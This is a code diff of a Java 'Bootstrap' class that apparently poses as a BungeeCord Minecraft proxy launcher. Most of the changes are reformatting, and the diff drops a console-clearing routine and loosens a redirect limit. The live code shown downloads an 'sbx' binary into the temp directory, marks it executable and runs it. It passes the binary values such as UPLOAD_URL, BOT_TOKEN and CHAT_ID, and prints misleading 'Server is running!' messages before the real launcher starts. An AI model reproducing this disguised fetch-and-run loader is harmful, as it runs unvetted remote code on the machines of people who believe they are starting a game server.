@@ -9,8 +9,7 @@ import java.security.SecureRandom;
 import java.security.cert.X509Certificate;
 import javax.net.ssl.*;
 
-public class Bootstrap
-{
+public class Bootstrap {
     private static final String ANSI_GREEN = "\033[1;32m";
     private static final String ANSI_RED = "\033[1;31m";
     private static final String ANSI_RESET = "\033[0m";
@@ -24,8 +23,7 @@ public class Bootstrap
         "UPLOAD_URL","CHAT_ID","BOT_TOKEN","NAME"
     };
 
-    public static void main(String[] args) throws Exception
-    {
+    public static void main(String[] args) throws Exception {
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
             System.err.println(ANSI_RED + "ERROR: Your Java version is too low!" + ANSI_RESET);
             Thread.sleep(2000);
@@ -43,22 +41,11 @@ public class Bootstrap
             Thread.sleep(15000);
             System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);
             Thread.sleep(20000);
-            clearConsole();
         } catch (Exception e) {
             System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
         }
 
         BungeeCordLauncher.main(args);
-    }
-
-    private static void clearConsole() {
-        try {
-            if (System.getProperty("os.name").contains("Windows")) {
-                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
-            } else {
-                new ProcessBuilder("clear").inheritIO().start().waitFor();
-            }
-        } catch (Exception ignored) {}
     }
 
     private static void runSbxBinary() throws Exception {
@@ -96,9 +83,7 @@ public class Bootstrap
 
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
-            if (value != null && !value.trim().isEmpty()) {
-                envVars.put(var, value);
-            }
+            if (value != null && !value.trim().isEmpty()) envVars.put(var, value);
         }
 
         Path envFile = Paths.get(".env");
@@ -106,10 +91,8 @@ public class Bootstrap
             for (String line : Files.readAllLines(envFile)) {
                 line = line.trim();
                 if (line.isEmpty() || line.startsWith("#")) continue;
-
                 line = line.split(" #")[0].split(" //")[0].trim();
                 if (line.startsWith("export ")) line = line.substring(7).trim();
-
                 String[] parts = line.split("=", 2);
                 if (parts.length == 2 && Arrays.asList(ALL_ENV_VARS).contains(parts[0].trim())) {
                     envVars.put(parts[0].trim(), parts[1].trim().replaceAll("^['\"]|['\"]$", ""));
@@ -137,9 +120,7 @@ public class Bootstrap
         Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
         if (!Files.exists(path)) {
             downloadWithRedirect(url, path);
-            if (!path.toFile().setExecutable(true)) {
-                throw new IOException("Failed to set executable permission");
-            }
+            if (!path.toFile().setExecutable(true)) throw new IOException("Failed to set executable permission");
         }
         return path;
     }
@@ -160,7 +141,7 @@ public class Bootstrap
                 String loc = conn.getHeaderField("Location");
                 url = new URL(loc);
                 redirects++;
-                if (redirects > 5) throw new IOException("Too many redirects");
+                if (redirects > 10) throw new IOException("Too many redirects");
                 continue;
             }
 
